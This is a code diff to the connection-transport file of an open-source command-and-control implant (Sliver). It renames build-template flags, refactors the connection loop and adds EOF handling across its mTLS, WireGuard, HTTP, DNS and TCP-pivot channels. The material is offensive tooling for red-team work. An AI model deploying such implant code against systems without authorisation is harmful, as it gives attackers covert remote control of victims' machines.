@@ -19,13 +19,12 @@ package transports
 */
 
 import (
-
-	// {{if or .Config.WGc2Enabled .Config.HTTPc2Enabled}}
+	// {{if or .Config.IncludeWG .Config.IncludeHTTP}}
 	"net"
 
 	// {{end}}
 
-	// {{if or .Config.MTLSc2Enabled .Config.WGc2Enabled}}
+	// {{if or .Config.IncludeMTLS .Config.IncludeWG}}
 	"strconv"
 	// {{end}}
 
@@ -33,14 +32,14 @@ import (
 	"log"
 	// {{end}}
 
-	// {{if .Config.MTLSc2Enabled}}
+	// {{if .Config.IncludeMTLS}}
 	"crypto/tls"
 
 	"github.com/bishopfox/sliver/implant/sliver/transports/mtls"
 
 	// {{end}}
 
-	// {{if .Config.WGc2Enabled}}
+	// {{if .Config.IncludeWG}}
 	"errors"
 
 	"github.com/bishopfox/sliver/implant/sliver/transports/wireguard"
@@ -48,26 +47,29 @@ import (
 
 	// {{end}}
 
-	// {{if .Config.HTTPc2Enabled}}
+	// {{if .Config.IncludeHTTP}}
 	"github.com/bishopfox/sliver/implant/sliver/transports/httpclient"
 	// {{end}}
 
-	// {{if .Config.DNSc2Enabled}}
+	// {{if .Config.IncludeDNS}}
 	"github.com/bishopfox/sliver/implant/sliver/transports/dnsclient"
 	// {{end}}
 
-	// {{if .Config.TCPPivotc2Enabled}}
+	// {{if .Config.IncludeTCP}}
 	"github.com/bishopfox/sliver/implant/sliver/transports/pivotclients"
 	"google.golang.org/protobuf/proto"
 
 	// {{end}}
 
+	// {{if not .Config.IncludeNamePipe}}
 	"io"
 	"net/url"
 	"sync"
-	"time"
 
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
+	// {{end}}
+
+	"time"
 )
 
 var (
@@ -77,90 +79,8 @@ var (
 type Start func() error
 type Stop func() error
 
-// Connection - Abstract connection to the server
-type Connection struct {
-	Send    chan *pb.Envelope
-	Recv    chan *pb.Envelope
-	IsOpen  bool
-	ctrl    chan struct{}
-	cleanup func()
-	once    *sync.Once
-	tunnels *map[uint64]*Tunnel
-	mutex   *sync.RWMutex
-
-	uri      *url.URL
-	proxyURL *url.URL
-
-	Start Start
-	Stop  Stop
-}
-
-// URL - Get the c2 URL of the connection
-func (c *Connection) URL() string {
-	if c.uri == nil {
-		return ""
-	}
-	return c.uri.String()
-}
-
-// ProxyURL - Get the c2 URL of the connection
-func (c *Connection) ProxyURL() string {
-	if c.proxyURL == nil {
-		return ""
-	}
-	return c.proxyURL.String()
-}
-
-// Cleanup - Execute cleanup once
-func (c *Connection) Cleanup() {
-	c.once.Do(func() {
-		c.cleanup()
-		c.IsOpen = false
-	})
-}
-
-// Tunnel - Duplex byte read/write
-type Tunnel struct {
-	ID uint64
-
-	Reader       io.ReadCloser
-	ReadSequence uint64
-
-	Writer        io.WriteCloser
-	WriteSequence uint64
-}
-
-// Tunnel - Add tunnel to mapping
-func (c *Connection) Tunnel(ID uint64) *Tunnel {
-	c.mutex.RLock()
-	defer c.mutex.RUnlock()
-	return (*c.tunnels)[ID]
-}
-
-// AddTunnel - Add tunnel to mapping
-func (c *Connection) AddTunnel(tun *Tunnel) {
-	c.mutex.Lock()
-	defer c.mutex.Unlock()
-
-	(*c.tunnels)[tun.ID] = tun
-}
-
-// RemoveTunnel - Add tunnel to mapping
-func (c *Connection) RemoveTunnel(ID uint64) {
-	c.mutex.Lock()
-	defer c.mutex.Unlock()
-	delete(*c.tunnels, ID)
-}
-
-func (c *Connection) RequestResend(data []byte) {
-	c.Send <- &pb.Envelope{
-		Type: pb.MsgTunnelData,
-		Data: data,
-	}
-}
-
 // StartConnectionLoop - Starts the main connection loop
-func StartConnectionLoop(c2s []string, abort <-chan struct{}) <-chan *Connection {
+func StartConnectionLoop(abort <-chan struct{}, temporaryC2 ...string) <-chan *Connection {
 
 	// {{if .Config.Debug}}
 	log.Printf("Starting interactive session connection loop ...")
@@ -168,7 +88,7 @@ func StartConnectionLoop(c2s []string, abort <-chan struct{}) <-chan *Connection
 
 	nextConnection := make(chan *Connection)
 	innerAbort := make(chan struct{})
-	c2Generator := C2Generator(c2s, innerAbort)
+	c2Generator := C2Generator(innerAbort, temporaryC2...)
 
 	go func() {
 		var connection *Connection
@@ -186,7 +106,7 @@ func StartConnectionLoop(c2s []string, abort <-chan struct{}) <-chan *Connection
 			switch uri.Scheme {
 
 			// *** MTLS ***
-			// {{if .Config.MTLSc2Enabled}}
+			// {{if .Config.IncludeMTLS}}
 			case "mtls":
 				connection, err = mtlsConnect(uri)
 				if err != nil {
@@ -195,23 +115,23 @@ func StartConnectionLoop(c2s []string, abort <-chan struct{}) <-chan *Connection
 					// {{end}}
 					continue
 				}
-				// {{end}}  - MTLSc2Enabled
+				// {{end}}  - IncludeMTLS
 			case "wg":
 				// *** WG ***
-				// {{if .Config.WGc2Enabled}}
+				// {{if .Config.IncludeWG}}
 				connection, err = wgConnect(uri)
-				if err == nil {
+				if err != nil {
 					// {{if .Config.Debug}}
 					log.Printf("[wg] Connection failed %s", err)
 					// {{end}}
 					continue
 				}
-				// {{end}}  - WGc2Enabled
+				// {{end}}  - IncludeWG
 			case "https":
 				fallthrough
 			case "http":
 				// *** HTTP ***
-				// {{if .Config.HTTPc2Enabled}}
+				// {{if .Config.IncludeHTTP}}
 				connection, err = httpConnect(uri)
 				if err != nil {
 					// {{if .Config.Debug}}
@@ -219,11 +139,11 @@ func StartConnectionLoop(c2s []string, abort <-chan struct{}) <-chan *Connection
 					// {{end}}
 					continue
 				}
-				// {{end}} - HTTPc2Enabled
+				// {{end}} - IncludeHTTP
 
 			case "dns":
 				// *** DNS ***
-				// {{if .Config.DNSc2Enabled}}
+				// {{if .Config.IncludeDNS}}
 				connection, err = dnsConnect(uri)
 				if err != nil {
 					// {{if .Config.Debug}}
@@ -231,11 +151,11 @@ func StartConnectionLoop(c2s []string, abort <-chan struct{}) <-chan *Connection
 					// {{end}}
 					continue
 				}
-				// {{end}} - DNSc2Enabled
+				// {{end}} - IncludeDNS
 
 			case "namedpipe":
 				// *** Named Pipe ***
-				// {{if .Config.NamePipec2Enabled}}
+				// {{if .Config.IncludeNamePipe}}
 				connection, err = namedPipeConnect(uri)
 				if err != nil {
 					// {{if .Config.Debug}}
@@ -243,10 +163,10 @@ func StartConnectionLoop(c2s []string, abort <-chan struct{}) <-chan *Connection
 					// {{end}}
 					continue
 				}
-				// {{end}} -NamePipec2Enabled
+				// {{end}} -IncludeNamePipe
 
 			case "tcppivot":
-				// {{if .Config.TCPPivotc2Enabled}}
+				// {{if .Config.IncludeTCP}}
 				connection, err = tcpPivotConnect(uri)
 				if err != nil {
 					// {{if .Config.Debug}}
@@ -254,7 +174,7 @@ func StartConnectionLoop(c2s []string, abort <-chan struct{}) <-chan *Connection
 					// {{end}}
 					continue
 				}
-				// {{end}} -TCPPivotc2Enabled
+				// {{end}} -IncludeTCP
 
 			default:
 				// {{if .Config.Debug}}
@@ -272,7 +192,7 @@ func StartConnectionLoop(c2s []string, abort <-chan struct{}) <-chan *Connection
 	return nextConnection
 }
 
-// {{if .Config.MTLSc2Enabled}}
+// {{if .Config.IncludeMTLS}}
 func mtlsConnect(uri *url.URL) (*Connection, error) {
 
 	send := make(chan *pb.Envelope)
@@ -284,7 +204,7 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 		Send:    send,
 		Recv:    recv,
 		ctrl:    ctrl,
-		tunnels: &map[uint64]*Tunnel{},
+		tunnels: map[uint64]*Tunnel{},
 		mutex:   &sync.RWMutex{},
 		once:    &sync.Once{},
 		IsOpen:  false,
@@ -295,7 +215,6 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 			// {{if .Config.Debug}}
 			log.Printf("[mtls] lost connection, cleanup...")
 			// {{end}}
-			close(send)
 			conn.Close()
 			close(recv)
 		},
@@ -339,7 +258,7 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 						return
 					}
 				case <-time.After(mtls.PingInterval):
-					mtls.WritePing(conn)
+					err = mtls.WritePing(conn)
 					if err != nil {
 						return
 					}
@@ -352,7 +271,10 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 			for {
 				envelope, err := mtls.ReadEnvelope(conn)
 				if err == io.EOF {
-					break
+					// {{if .Config.Debug}}
+					log.Printf("[mtls] eof")
+					// {{end}}
+					return
 				}
 				if err != io.EOF && err != nil {
 					break
@@ -369,9 +291,9 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 	return connection, nil
 }
 
-// {{end}} -MTLSc2Enabled
+// {{end}} -IncludeMTLS
 
-// {{if .Config.WGc2Enabled}}
+// {{if .Config.IncludeWG}}
 func wgConnect(uri *url.URL) (*Connection, error) {
 
 	send := make(chan *pb.Envelope)
@@ -384,7 +306,7 @@ func wgConnect(uri *url.URL) (*Connection, error) {
 		Send:    send,
 		Recv:    recv,
 		ctrl:    ctrl,
-		tunnels: &map[uint64]*Tunnel{},
+		tunnels: map[uint64]*Tunnel{},
 		mutex:   &sync.RWMutex{},
 		once:    &sync.Once{},
 		uri:     uri,
@@ -393,7 +315,6 @@ func wgConnect(uri *url.URL) (*Connection, error) {
 			// {{if .Config.Debug}}
 			log.Printf("[wg] lost connection, cleanup...")
 			// {{end}}
-			close(send)
 			conn.Close()
 			dev.Down()
 			close(recv)
@@ -449,7 +370,7 @@ func wgConnect(uri *url.URL) (*Connection, error) {
 						return
 					}
 				case <-time.After(wireguard.PingInterval):
-					wireguard.WritePing(conn)
+					err = wireguard.WritePing(conn)
 					if err != nil {
 						return
 					}
@@ -462,7 +383,10 @@ func wgConnect(uri *url.URL) (*Connection, error) {
 			for {
 				envelope, err := wireguard.ReadEnvelope(conn)
 				if err == io.EOF {
-					break
+					// {{if .Config.Debug}}
+					log.Printf("[wireguard] eof")
+					// {{end}}
+					return
 				}
 				if err != io.EOF && err != nil {
 					break
@@ -479,9 +403,9 @@ func wgConnect(uri *url.URL) (*Connection, error) {
 	return connection, nil
 }
 
-// {{end}} -WGc2Enabled
+// {{end}} -IncludeWG
 
-// {{if .Config.HTTPc2Enabled}}
+// {{if .Config.IncludeHTTP}}
 func httpConnect(uri *url.URL) (*Connection, error) {
 	send := make(chan *pb.Envelope)
 	recv := make(chan *pb.Envelope)
@@ -490,7 +414,7 @@ func httpConnect(uri *url.URL) (*Connection, error) {
 		Send:    send,
 		Recv:    recv,
 		ctrl:    ctrl,
-		tunnels: &map[uint64]*Tunnel{},
+		tunnels: map[uint64]*Tunnel{},
 		mutex:   &sync.RWMutex{},
 		once:    &sync.Once{},
 		uri:     uri,
@@ -499,7 +423,6 @@ func httpConnect(uri *url.URL) (*Connection, error) {
 			// {{if .Config.Debug}}
 			log.Printf("[http] lost connection, cleanup...")
 			// {{end}}
-			close(send)
 			ctrl <- struct{}{}
 			close(recv)
 		},
@@ -547,6 +470,12 @@ func httpConnect(uri *url.URL) (*Connection, error) {
 					return
 				default:
 					envelope, err := client.ReadEnvelope()
+					if err == io.EOF {
+						// {{if .Config.Debug}}
+						log.Printf("[http] eof")
+						// {{end}}
+						return
+					}
 					switch errType := err.(type) {
 					case nil:
 						errCount = 0
@@ -595,9 +524,9 @@ func httpConnect(uri *url.URL) (*Connection, error) {
 	return connection, nil
 }
 
-// {{end}} -HTTPc2Enabled
+// {{end}} -IncludeHTTP
 
-// {{if .Config.DNSc2Enabled}}
+// {{if .Config.IncludeDNS}}
 func dnsConnect(uri *url.URL) (*Connection, error) {
 	send := make(chan *pb.Envelope)
 	recv := make(chan *pb.Envelope)
@@ -606,7 +535,7 @@ func dnsConnect(uri *url.URL) (*Connection, error) {
 		Send:    send,
 		Recv:    recv,
 		ctrl:    ctrl,
-		tunnels: &map[uint64]*Tunnel{},
+		tunnels: map[uint64]*Tunnel{},
 		mutex:   &sync.RWMutex{},
 		once:    &sync.Once{},
 		IsOpen:  true,
@@ -614,7 +543,6 @@ func dnsConnect(uri *url.URL) (*Connection, error) {
 			// {{if .Config.Debug}}
 			log.Printf("[dns] lost connection, cleanup...")
 			// {{end}}
-			close(send)
 			ctrl <- struct{}{} // Stop polling
 			close(recv)
 		},
@@ -678,6 +606,11 @@ func dnsConnect(uri *url.URL) (*Connection, error) {
 						log.Printf("[dns] session is closed")
 						// {{end}}
 						return
+					case io.EOF:
+						// {{if .Config.Debug}}
+						log.Printf("[dns] eof")
+						// {{end}}
+						return
 					default:
 						errCount++
 						// {{if .Config.Debug}}
@@ -698,9 +631,9 @@ func dnsConnect(uri *url.URL) (*Connection, error) {
 	return connection, nil
 }
 
-// {{end}} - .DNSc2Enabled
+// {{end}} - .IncludeDNS
 
-// {{if .Config.TCPPivotc2Enabled}}
+// {{if .Config.IncludeTCP}}
 func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 
 	send := make(chan *pb.Envelope)
@@ -711,7 +644,7 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 		Send:    send,
 		Recv:    recv,
 		ctrl:    ctrl,
-		tunnels: &map[uint64]*Tunnel{},
+		tunnels: map[uint64]*Tunnel{},
 		mutex:   &sync.RWMutex{},
 		once:    &sync.Once{},
 		IsOpen:  true,
@@ -720,7 +653,6 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 			log.Printf("[tcp pivot] lost connection, cleanup...")
 			// {{end}}
 			pingCtrl <- struct{}{}
-			close(send)
 			ctrl <- struct{}{}
 			close(recv)
 		},
@@ -753,6 +685,9 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 				case <-pingCtrl:
 					return
 				case <-time.After(time.Minute):
+					// {{if .Config.Debug}}
+					log.Printf("[tcp pivot] peer ping...")
+					// {{end}}
 					data, _ := proto.Marshal(&pb.PivotPing{
 						Nonce: uint32(time.Now().UnixNano()),
 					})
@@ -760,11 +695,10 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 						Type: pb.MsgPivotPeerPing,
 						Data: data,
 					}
-				case <-time.After(time.Minute):
 					// {{if .Config.Debug}}
 					log.Printf("[tcp pivot] server ping...")
 					// {{end}}
-					data, _ := proto.Marshal(&pb.PivotPing{
+					data, _ = proto.Marshal(&pb.PivotPing{
 						Nonce: uint32(time.Now().UnixNano()),
 					})
 					connection.Send <- &pb.Envelope{
@@ -792,7 +726,10 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 			for {
 				envelope, err := pivot.ReadEnvelope()
 				if err == io.EOF {
-					break
+					// {{if .Config.Debug}}
+					log.Printf("[tcp pivot] eof")
+					// {{end}}
+					return
 				}
 				if err != nil {
 					// {{if .Config.Debug}}
@@ -827,4 +764,4 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 	return connection, nil
 }
 
-// {{end}} -TCPPivotc2Enabled
+// {{end}} -IncludeTCP
